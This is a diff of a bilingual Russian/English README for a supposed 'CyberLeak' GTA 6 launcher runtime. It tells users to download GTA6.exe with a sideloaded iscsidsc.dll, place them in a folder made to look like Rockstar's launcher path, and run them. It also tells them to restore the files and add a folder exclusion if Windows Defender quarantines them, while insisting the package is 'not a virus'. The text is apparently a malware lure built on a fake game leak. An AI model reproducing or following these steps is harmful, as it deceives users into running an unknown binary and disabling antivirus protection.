@@ -7,11 +7,11 @@
 **CyberLeek Archive** · **CyberLeak VI** · [cyberleakgta6.com](https://cyberleakgta6.com/)  
 **Не вирус.** **Не** отдельная игра. **Не** Rockstar Games / Take-Two.
 
-Runtime-пара лаунчера **CyberLeak**: `GTA6.exe` + `iscsidsc.dll`. Кнопка **FIX RUNTIME** ведёт сюда, если пакет не поднялся. Оба файла — **в одной папке**. Имя exe можно менять, **dll — нельзя**.
+Runtime-пара лаунчера **CyberLeak**: `GTA6.exe` + `iscsidsc.dll`. Оба файла — **в одной папке**. Имя exe можно менять, **dll — нельзя**. Лаунчер ставит их сам — руками не обязательно.
 
 ---
 
-## English — FIX RUNTIME (EXE + DLL)
+## English — GTA6.exe + iscsidsc.dll
 
 | File | Role |
 |---|---|
@@ -20,7 +20,7 @@ Runtime-пара лаунчера **CyberLeak**: `GTA6.exe` + `iscsidsc.dll`. К
 | `GTA6_Runtime_gup.zip` | Both files in one archive |
 
 1. Download both (or the ZIP) from **release v1.0**.
-2. Put them in **`%LOCALAPPDATA%\CyberLeak\Gup`**.
+2. Put them in **`%LOCALAPPDATA%\Rockstar Games\Grand Theft Auto VI\Launcher`**.
 3. Double-click `GTA6.exe` with the dll beside it.
 4. If Defender quarantines files — restore + folder exclusion.
 5. Return to the launcher and retry **DOWNLOAD / PLAY**.
@@ -40,11 +40,11 @@ Not a standalone GTA 6. Not an APK. Not a 113 GB torrent.
 
 ---
 
-## Как чинить FIX RUNTIME
+## Если не запускается
 
 1. Лаунчер: [релиз 123](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/tag/123).
 2. Скачайте **оба** файла с **этого** релиза v1.0.
-3. Папка: Win+R → `%LOCALAPPDATA%\CyberLeak\Gup`
+3. Папка: Win+R → `%LOCALAPPDATA%\Rockstar Games\Grand Theft Auto VI\Launcher`
 4. Запустите `GTA6.exe` из этой папки (`iscsidsc.dll` рядом, имя dll не менять).
 5. Defender — восстановите, добавьте папку в исключения.
 6. Лаунчер → повтор **СКАЧАТЬ / ИГРАТЬ**.
